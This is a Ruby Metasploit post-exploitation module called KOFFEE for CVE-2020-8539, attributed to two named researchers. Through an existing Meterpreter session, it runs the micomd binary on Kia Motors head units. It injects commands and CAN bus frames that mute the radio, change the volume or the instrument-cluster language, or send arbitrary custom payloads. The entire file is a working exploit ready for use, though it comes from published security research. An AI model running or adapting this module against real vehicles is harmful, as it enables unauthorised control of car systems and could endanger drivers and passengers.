# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'readline'

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'KOFFEE - Kia OFFensivE Exploit',
        'Description' => %q{
          This module exploits CVE-2020-8539, which is an arbitrary code execution vulnerability that allows an to attacker execute the micomd binary file on the head unit of Kia Motors.
          This module has been tested on SOP.003.30.18.0703, SOP.005.7.181019 and SOP.007.1.191209 head unit software version.
          This module, run on an active session, allows an attacker to send crafted micomd commands that allow the attacker
          to control the head unit and send CAN bus frames into the Multimedia CAN (M-Can) of the vehicle.
        },
        'SessionTypes' => ['meterpreter'],
        'Author' =>
          [
            'Gianpiero Costantino',
            'Ilaria Matteucci'
          ],
        'References' =>
          [
            ['CVE', '2020-8539'],
            ['URL', 'https://sowhat.iit.cnr.it/pdf/IIT-20-2020.pdf']
          ],
        'Actions' => [
          [ 'TOGGLE_RADIO_MUTE', { 'Description' => 'It mutes/umutes the radio' } ],
          [ 'REDUCE_RADIO_VOLUME', { 'Description' => 'It reduces radio volume' } ],
          [ 'MAX_RADIO_VOLUME', { 'Description' => 'It sets the radio volume to the max' } ],
          [ 'CHANGE_CLUSTER_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],
          [ 'INJECT_CUSTOM', { 'Description' => 'It injects custom micom payloads' } ]
        ],
        'DefaultAction' => 'TOGGLE_RADIO_MUTE',
        'Platform' => 'Android',
        'DisclosureDate' => '2020-12-02',
        'License' => MSF_LICENSE
      )
    )
    register_options([
      OptString.new('MICOMD', [true, 'Path to micomd executable', '/system/bin/micomd']),
      OptString.new('PERIOD', [true, 'Time (ms) interval between two MICOM commands, aka Period of CAN frames', '0.200']),
      OptInt.new('NUM_MSG', [true, 'Number of MICOM commands sent each time', '5']),
      OptString.new('CMD_PAYLOAD', [ false, 'Micom payload to inject, e.g.,  cmd byte1 byte3 byte2', '00 00 00'], conditions: %w[ACTION == INJECT_CUSTOM]),
    ])
  end

  def send_in(m_cmd)
    print_status(' -- Sending Command -- ')
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    cmd_exec(cmd)
    print_good(' -- Command Sent-- ')
  end

  def send_out(m_cmd)
    print_status(' -- Sending Command -- ')
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    cmd_exec(cmd)
    print_good(' -- Command Sent-- ')
  end

  def send_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    var = 0
    while var < datastore['NUM_MSG'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
    print_good(' -- Custom payload Sent-- ')
  end

  def send_out_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    var = 0
    while var < datastore['Num_msg'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
    print_good(' -- CAN bus frames sent-- ')
  end

  def run
    # all conditional options are required when active, make sure none of them are blank
    options.each_pair do |name, option|
      next if option.conditions.empty?
      next unless Msf::OptCondition.show_option(self, option)

      fail_with(Failure::BadConfig, "The #{name} option is required by the #{action.name} action.") if datastore[name].blank?
    end
    print_status(' -- Starting action -- ')
    send("action_#{action.name.downcase}")
  end

  def action_toggle_radio_mute
    print_status(' -- Mute/umute radio -- ')
    send_in('8351 04')
  end

  def action_reduce_radio_volume
    print_status(' -- Reduce radio volume -- ')
    send_out('0112 F4 01')
  end

  def action_max_radio_volume
    print_status(' -- Max radio volume -- ')
    send_out('0112 F0')
  end

  def action_change_cluster_language
    print_status(' -- Korean -- ')
    send_out_custom('4D3 01')
    print_status(' -- Arabic -- ')
    send_out_custom('4D3 08')
    print_status(' -- Polish -- ')
    send_out_custom('4D3 0E')
    print_status(' -- Italian -- ')
    send_out_custom('4D3 12')
  end

  def action_inject_custom
    print_status(" -- Injecting custom payload  (#{datastore['CMD_PAYLOAD']}) -- ")
    send_custom(datastore['CMD_PAYLOAD'])
  end
end
